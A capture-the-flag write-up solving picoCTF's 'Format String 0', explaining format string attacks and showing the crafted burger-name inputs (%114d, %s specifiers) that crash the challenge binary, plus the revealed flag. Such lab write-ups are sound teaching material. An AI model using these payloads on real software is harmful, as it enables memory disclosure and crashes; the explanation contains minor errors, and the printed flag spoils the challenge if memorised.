# PicoCTF-Format String 0

## Problem Statement
"Can you use your knowledge of format strings to make the customers happy?"
This is challenge deals with the knowledge of Format Specifier Attacks .

## Thought Process
Firstly the challenge name clearly specifies how to approach this problem . After some further research on the format specifier attacks . This is what we've ended up with : A format string attack is a type of security vulnerability that can occur when a program takes user input and directly incorporates it into a format string. This can lead to unintended consequences, such as memory leaks, crashes, or even arbitrary code execution.Attackers can exploit this vulnerability by crafting malicious input that manipulates the format string to Read Arbitrary Memory. 

By using format specifiers like %x, an attacker can read the contents of specific memory addresses.
By combining this with address calculations, attackers can potentially read sensitive data like passwords, encryption keys, or even parts of the program's code. They can also Write Arbitrary Memory, Using format specifiers like %n, an attacker can write values to specific memory locations.This can lead to memory corruption, program crashes, or even arbitrary code execution. So in usual cases we can input **%x%x%x%x%x%x%x%x%x%x%x%x** and just like buffer flow , exceed the memory allocated using these format specifiers and trigger it into giving us the flag . 

## Solution
Proceeding with the execution 
```bash 
weeeing-picoctf@webshell:~$ nc mimas.picoctf.net 63634
```
We get a the following , demanding for an input :
```bash 
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
```
After Inspecting the code provided we find that in line 63:
```c
   char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
```
We can see that the format specifier follows a certain syntax colour coding , which helps us distinguish the key from others here **%144d** and the way this functions is if printf encounters %114d, it expects to print a number with a width of 114 characters. Since no number is provided, it can print some garbage data, inflating the count to 114 characters. After entering the option we get the following :

```bash 
We can see the format specifiers needed to 
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
```
On inspecting the c code for this segment we find that Classic_Cheesteak stands out the most.
```c
"(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);
```
This is because of the format specifier **%s** as it usually expects a string as an argument , in this case it still tries to process the word steak which would cause the program to crash and and help us obtian the flag .

```bash
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
```
## <3